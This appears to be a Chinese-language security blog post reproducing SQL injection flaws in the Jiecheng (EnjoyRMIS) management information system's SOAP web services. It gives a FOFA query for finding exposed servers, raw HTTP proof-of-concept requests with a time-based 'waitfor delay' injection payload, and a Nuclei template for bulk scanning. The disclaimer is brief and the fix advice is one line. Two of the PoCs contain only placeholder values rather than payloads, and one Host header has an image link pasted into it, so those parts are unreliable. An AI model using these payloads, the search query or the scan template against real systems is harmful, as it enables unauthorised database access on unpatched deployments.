# 原创
：  漏洞复现--捷诚管理信息系统多处SQL注入

# 漏洞复现--捷诚管理信息系统多处SQL注入

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

捷诚管理信息系统是一款功能全面，可以支持自营、联营到外柜租赁的管理，其自身带工作流管理工具，能够帮助企业有效的开展内部审批工作。该产品CWSFinanceCommon.asmx、CWSHr.asmx、cwsoa.asmx多处接口存在SQL注入。

### 二：漏洞影响版本

全版本

### 三：网络空间测绘查询

fofa:<br/> `body="/Scripts/EnjoyMsg.js"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/94504ae42cd197305cc199d907495bd3.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b0aac210ccfa5a69a90141616afbc394.jpeg"/><br/> POC1:

```
POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Connection: close
Content-Length: 369
Accept: */*
Accept-Language: en
Content-Type: text/xml; charset=utf-8
Accept-Encoding: gzip

&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
  &lt;soap:Body&gt;
    &lt;GetOSpById xmlns="http://tempuri.org/"&gt;
      &lt;sId&gt;1';waitfor delay '0:0:5'--+&lt;/sId&gt;
    &lt;/GetOSpById&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;

```

延时注入5秒<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/63b4373192d4acbefddfecf39b8c1102.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c54751ace4b49692f342d30e9e5a5e8b.jpeg"/><br/> POC2：

```
POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
SOAPAction: http://tempuri.org/GetLeaveReqById
Content-Type: text/xml;charset=UTF-8
Content-Length: 316

&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/"&gt;
   &lt;soapenv:Header/&gt;
   &lt;soapenv:Body&gt;
      &lt;tem:GetLeaveReqById&gt;
         &lt;!--type: string--&gt;
         &lt;tem:sId&gt;gero et&lt;/tem:sId&gt;
      &lt;/tem:GetLeaveReqById&gt;
   &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/491789b56c154462725cd597635bcc3d.jpeg"/><br/> POC3:

```
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Host: x.x.x.x![image.png](https://image.3001.net/images/20231122/1700631040_655d920042b6ad451a8e4.png!small)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: http://tempuri.org/GetOAById
Content-Type: text/xml;charset=UTF-8
Content-Length: 276

&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/"&gt;
   &lt;soap:Header/&gt;
   &lt;soap:Body&gt;
      &lt;tem:GetOAById&gt;
         &lt;!--type: string--&gt;
         &lt;tem:sId&gt;gero et&lt;/tem:sId&gt;
      &lt;/tem:GetOAById&gt;
   &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;

```

### 五：批量验证

```
id: jiecheng-CWSFinanceCommon-sqli

info:
  name: 捷诚管理信息系统 CWSFinanceCommon.asmx SQL注入漏洞
  author: fgz
  severity: high
  description: '捷诚管理信息系统是一款功能全面，可以支持自营、联营到外柜租赁的管理，其自身带工作流管理工具，能够帮助企业有效的开展内部审批工作。该系统CWSFinanceCommon.asmx 存在sql注入漏洞。黑客可以通过该漏洞获取数据库敏感信息，甚至远控服务器。'
  tags: 2023,jiecheng,sqli
  metadata:
    max-request: 3
    fofa-query: body="/Scripts/EnjoyMsg.js"
    verified: true

http:
  - method: POST
    path:
      - "{{BaseURL}}/EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx"
    headers:
      Content-Type: text/xml; charset=utf-8
    body: "&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"\
      http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
      \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\n  &lt;soap:Body&gt;\n\
      \    &lt;GetOSpById xmlns=\"http://tempuri.org/\"&gt;\n      &lt;sId&gt;1';waitfor delay\
      \ '0:0:5'--+&lt;/sId&gt;\n    &lt;/GetOSpById&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;"
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 &amp;&amp; duration&gt;=5 &amp;&amp; duration&lt;=6"

```

### 六：修复建议

联系厂家获取修复补丁。
